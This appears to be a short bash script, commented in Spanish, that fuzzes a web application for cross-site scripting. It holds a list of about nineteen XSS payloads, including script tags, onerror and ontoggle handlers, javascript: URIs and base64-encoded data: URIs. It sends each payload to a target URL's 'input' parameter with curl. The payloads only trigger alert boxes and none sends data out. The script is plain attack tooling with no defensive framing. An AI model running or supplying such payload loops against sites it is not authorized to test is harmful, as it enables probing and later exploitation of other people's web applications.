xss_tags=(
  "<script>alert('XSS')</script>" # 
  "<img src='x' onerror='alert(\"XSS\")'>" #
  "<div style='color: expression(alert(\"XSS\"));'>"#
  "<svg><script>alert(1)</script></svg>" #
  "<marquee><h1>XSS</h1></marquee>" #
  "<body onload=alert(1)>" #
  "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='>"
  "<iframe src='javascript:alert(\"XSS\")'>"
  "<link rel='import' href='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='>"
  "<embed src='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='>"
  "<math><a xlink:href='data:x,<script>alert(1)</script>'>CLICKME</a></math>"
  "<form><button formaction='javascript:alert(\"XSS\")'>XSS</button></form>"
  "<isindex type=image src=1 onerror=alert(1)>"
  "<frame src='javascript:alert(\"XSS\")'>"
  "<b><svg><script>alert(1)></script></svg></b>"
  "<details open ontoggle=alert(1)><summary>XSS</summary></details>"
  "<keygen onfocus=alert(1)>"
  "<audio src='data:audio/x;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='>"
  "<video src='data:video/x;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='>"
)

# Realiza una solicitud HTTP utilizando curl para cada etiqueta de la lista
for tag in "${xss_tags[@]}"; do
  echo "Probando etiqueta: $tag"
  curl "$url?input=$tag"
done
